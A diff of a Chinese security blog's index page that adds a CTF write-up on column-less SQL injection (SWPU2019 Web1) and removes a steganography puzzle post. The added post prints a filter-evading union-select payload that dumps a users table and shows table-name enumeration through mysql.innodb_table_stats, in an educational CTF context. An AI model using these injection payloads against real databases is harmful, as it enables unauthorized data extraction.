@@ -182,6 +182,107 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://mayi077.github.io/2020/02/10/SWPU2019-Web1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="信安小蚂蚁">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="信安小蚂蚁">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/02/10/SWPU2019-Web1/" class="post-title-link" itemprop="url">[SWPU2019]Web1</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-02-10 14:10:42" itemprop="dateCreated datePublished" datetime="2020-02-10T14:10:42+08:00">2020-02-10</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-03-24 21:48:50" itemprop="dateModified" datetime="2020-03-24T21:48:50+08:00">2020-03-24</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF复现</span>
+                  </a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>1.2k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>3 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>这题主要考查了，无列名注入和mysql.innodb_table_stats用于报表名。 <a href="https://osandamalith.com/2020/01/27/alternatives-to-extract-tables-and-columns-from-mysql-and-mariadb/" target="_blank" rel="noopener">【这里有其它报表名方法】</a></p>
+<h3 id="用mysql-innodb-table-stats报表名"><a href="#用mysql-innodb-table-stats报表名" class="headerlink" title="用mysql.innodb_table_stats报表名"></a>用mysql.innodb_table_stats报表名</h3><p><a href="https://mariadb.com/kb/en/mysqlinnodb_table_stats/" target="_blank" rel="noopener">详细说明</a><br><code>select group_concat(table_name) from mysql.innodb_table_stats</code> 此payload可以报表名。</p>
+<h3 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h3><p><a href="https://blog.csdn.net/chasingin/article/details/103476001" target="_blank" rel="noopener">参考链接</a><br>举个例子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3 union select * from users;</span><br><span class="line">&#x2F;&#x2F; 使用这个语句，前面的select 1，2，3 会变成列名。如果此时我们再使用下面的语句</span><br><span class="line">slecet 2 form (select 1,2,3 union select * from users)a; </span><br><span class="line">&#x2F;&#x2F; 就可以得到我们的第二列的所有数据</span><br></pre></td></tr></table></figure>
+
+<h3 id="下面再来分析以下此题的payload"><a href="#下面再来分析以下此题的payload" class="headerlink" title="下面再来分析以下此题的payload"></a>下面再来分析以下此题的payload</h3><p>对了，值得注意的是这题过滤了注释符，所以我们用<code>&#39;</code>来闭合语句。然后也过滤了空格，我们用/**/代替。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(a)&#x2F;**&#x2F;from(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;as&#x2F;**&#x2F;a&#x2F;**&#x2F;union&#x2F;**&#x2F;select*from&#x2F;**&#x2F;users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x2F;**&#x2F;&#39;</span><br></pre></td></tr></table></figure>
+
+<p>&emsp;首先我们发现总共有22个字段且第二个字段可以回显给我们，所以第二个字段突破。<br>&emsp;第二个字段的内容为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select group_concat(a) from (select 1,2,3 as a union select*from users)x)</span><br></pre></td></tr></table></figure>
+<p>我们可以知道这里用了2种重命名方式，第一种是as 后面接别名，第二种是（）后面接别名。而group_concat只是为了把想要数据全部显示出来（一行）。  </p>
+<p>&emsp;<code>(select 1,2,3 as a union select*from users)</code>这里的第一个select就是给它们的列重命名，union后面就是得到一个重命名后的数据表，然后取别名为<code>x</code>。<br>&emsp;最后相当于<code>select group_concat(1,2,3) form x</code>从而把整个表里的数据回显。<br><strong>注：sql中过滤了 * 号。在无列名注入的时候 一定要和表的列数相同，不然会报错 。</strong><br><strong>改：</strong> <code>select 1,2,3 as a</code> 只会把第3列重名为 a 。这次测试中必须要给重名一个列重命名否者无法正确读取数据 – 2020/3/11（mysql 5.5.53）</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://mayi077.github.io/2020/02/10/GXYCTF2019-Ping-Ping-Ping/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -619,103 +720,6 @@
   
   
 
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://mayi077.github.io/2020/02/03/%E4%B9%9D%E8%BF%9E%E7%8E%AF/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/1.jpg">
-      <meta itemprop="name" content="信安小蚂蚁">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="信安小蚂蚁">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/02/03/%E4%B9%9D%E8%BF%9E%E7%8E%AF/" class="post-title-link" itemprop="url">九连环</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2020-02-03 15:54:47" itemprop="dateCreated datePublished" datetime="2020-02-03T15:54:47+08:00">2020-02-03</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-02-15 17:05:00" itemprop="dateModified" datetime="2020-02-15T17:05:00+08:00">2020-02-15</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index">
-                    <span itemprop="name">CTF复现</span>
-                  </a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-file-word-o"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>426</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-clock-o"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h4 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h4><p>&emsp;通过这题我们可以学习一款新工具，steghide，他可以帮我们提取出一些隐藏文件（大概是用他这个软件隐藏的，不限于此），接下来我们来看看这题吧。</p>
-<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
-<li>下载文件，得到一个图片开始以为文件名是什么的密码，结果然并luan。我们用foremost分解出一个压缩包，里面有一个图片和一个压缩包，压缩包没加密，图片加密了。</li>
-<li>丢进winhex对比zip构造图，发现压缩方式处为0000 也就是说没有加密方式那么就是伪加密。我们按照以前的知识可以删除伪加密，解出压缩包。</li>
-<li>因为qwe.zip有密码，而又只给了我们一个<code>good-宸插悎骞</code>图片所以从图片下手。经过多种方法无果。</li>
-<li>通过wp得知可以用 steghide 来提取出一个文件。kali安装steghide后使用<br><code>steghhide extract -sf &quot;文件名&quot;</code><br>回车后提示要密码，我们这里没设置密码直接回车即可。得到ko.txt。文件内容为：<br><img data-src="https://pic.downk.cc/item/5e37d1452fb38b8c3c7fe538.jpg" alt=""></li>
-<li>然后去解压qwe.zip，得到flag.txt<br><img data-src="https://pic.downk.cc/item/5e37d1952fb38b8c3c7ff0c1.jpg" alt=""></li>
-</ol>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
   </div>
 
   
@@ -787,18 +791,18 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
           <a href="/archives">
-          <span class="site-state-item-count">134</span>
+          <span class="site-state-item-count">135</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
-        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-count">11</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
-        <span class="site-state-item-count">85</span>
+        <span class="site-state-item-count">86</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
